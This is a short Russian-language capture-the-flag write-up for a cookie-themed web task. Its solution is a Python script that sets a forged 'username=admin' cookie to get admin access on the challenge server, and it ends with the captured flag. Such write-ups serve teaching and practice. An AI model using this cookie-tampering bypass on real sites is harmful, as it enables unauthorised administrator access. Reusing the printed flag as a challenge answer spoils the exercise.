## Описание

Здесь собираются только самые изысканные ценители печенек и сладких угощений.

## Решение

Нужно зайти через админа на сайте. Из подсказки про печеньки понимаем, что копать надо в сторону cookies.

Отправляем запрос с cookies:

```
import requests


def cookie_manipulation():
    base_url = "http://tasks.duckerz.ru:30051/"

    cookies = {'username': 'admin'}
    response = requests.get(f"{base_url}/index.php", cookies=cookies)
    print(response.text)


cookie_manipulation()
```


<div class="info-box">DUCKERZ{N0t_$3CR3t_c00Kie}</div>
